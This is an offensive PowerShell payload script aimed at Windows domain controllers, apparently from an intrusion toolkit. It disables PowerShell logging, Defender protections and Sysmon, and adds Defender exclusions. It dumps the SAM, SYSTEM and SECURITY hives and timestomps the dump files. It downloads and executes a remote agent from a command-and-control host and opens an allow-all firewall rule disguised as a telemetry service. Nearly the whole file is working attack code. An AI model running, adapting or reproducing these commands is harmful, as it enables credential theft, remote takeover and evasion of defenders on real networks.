# ============================================================
# DC PRIMARY PAYLOAD - Tier 1 (Domain Controllers)
# ============================================================
# Maximum stealth + credential dump + C2 beacon + defense evasion
# Target: Domain Controllers (highest value)
# ============================================================

# DEFENSE EVASION: Disable Script Block Logging + Module Logging
$sb='HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging'; $ml='HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging'; @($sb,$ml) | ForEach-Object { if(!(Test-Path $_)){New-Item -Path $_ -Force|Out-Null} }; Set-ItemProperty $sb -Name EnableScriptBlockLogging -Value 0 -Type DWord -Force; Set-ItemProperty $ml -Name EnableModuleLogging -Value 0 -Type DWord -Force

# DEFENSE EVASION: Add Defender exclusion paths
Add-MpPreference -ExclusionPath 'C:\ProgramData' -Force; Add-MpPreference -ExclusionPath $env:TEMP -Force; Add-MpPreference -ExclusionPath 'C:\Windows\Temp' -Force

# DEFENSE EVASION: Disable Defender tamper protection workaround
$p='HKLM:\SOFTWARE\Microsoft\Windows Defender'; $paths=@("$p\Features",'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender'); $paths|ForEach-Object{if(!(Test-Path $_)){New-Item -Path $_ -Force|Out-Null}}; Set-ItemProperty "$p\Features" -Name TamperProtection -Value 4 -Type DWord -Force -EA 0; Set-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name DisableAntiSpyware -Value 1 -Type DWord -Force

# CREDENTIAL ACCESS: Dump SAM + SYSTEM + SECURITY hives (LSA secrets)
cmd /c "reg save HKLM\SAM C:\ProgramData\s.dat /y & reg save HKLM\SYSTEM C:\ProgramData\sy.dat /y & reg save HKLM\SECURITY C:\ProgramData\se.dat /y"

# CREDENTIAL ACCESS: Timestomp the credential dumps
$f=Get-Item 'C:\ProgramData\s.dat' -EA 0; if($f){$f.LastWriteTime='2024-01-15 08:30:00'; $f.CreationTime='2023-11-20 14:15:00'; $f.LastAccessTime='2024-01-15 08:30:00'}
$f=Get-Item 'C:\ProgramData\sy.dat' -EA 0; if($f){$f.LastWriteTime='2024-01-15 08:30:00'; $f.CreationTime='2023-11-20 14:15:00'; $f.LastAccessTime='2024-01-15 08:30:00'}
$f=Get-Item 'C:\ProgramData\se.dat' -EA 0; if($f){$f.LastWriteTime='2024-01-15 08:30:00'; $f.CreationTime='2023-11-20 14:15:00'; $f.LastAccessTime='2024-01-15 08:30:00'}

# C2 BEACON: PowerShell download cradle (obfuscated, no IEX on command line)
$w=New-Object Net.WebClient;$s=$w.DownloadString('http://10.0.0.100:8080/agent.ps1');[scriptblock]::Create($s).Invoke()

# FIREWALL: Stealthy allow-all rule (firewall stays "on" but allows everything)
cmd /c "netsh advfirewall firewall add rule name=""Windows Telemetry Service"" dir=in action=allow protocol=any enable=yes"

# SERVICE MANIPULATION: Disable Sysmon
cmd /c "sc stop Sysmon64 2>nul & sc config Sysmon64 start= disabled 2>nul & sc stop Sysmon 2>nul & sc config Sysmon start= disabled 2>nul"

# SERVICE MANIPULATION: Unload Sysmon driver
cmd /c "fltMC unload SysmonDrv 2>nul & sc stop Sysmon64 2>nul & sc config Sysmon64 start= disabled 2>nul"
